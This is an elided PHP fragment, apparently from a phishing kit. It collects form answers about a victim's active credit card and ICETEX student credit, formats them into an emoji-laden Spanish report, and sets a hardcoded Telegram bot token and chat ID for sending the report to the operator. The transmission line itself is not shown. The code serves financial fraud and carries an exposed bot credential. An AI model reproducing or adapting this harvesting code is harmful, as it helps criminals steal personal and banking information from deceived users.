...
if($_SERVER["REQUEST_METHOD"] == "POST"){
    ...
    $otra = $_POST['otra'];
    $cc_activa = $_POST['cc_activa'];

    if($cc_activa == "tienecc"){
        $cc_activa = "Tiene Tarjeta Activa";
    }else{
        $cc_activa = "No tiene Tarjeta";
    }

    if($otra == "Icetex"){
        $otra = "Esta CLAVADO con el ICETEX";
    }
    ...
    $contenido .= "\n ⁉️Preguntas ⁉️";
    $contenido .= "\n 💳Tiene Credito: $otra";
    $contenido .= "\n 💳Tiene Cc Activa: $cc_activa";

    $token = "6722376290:AAFNQ4fzascwow-ZWFphclLhSESa1M5nhI8";
    $chatId = "5826711906";
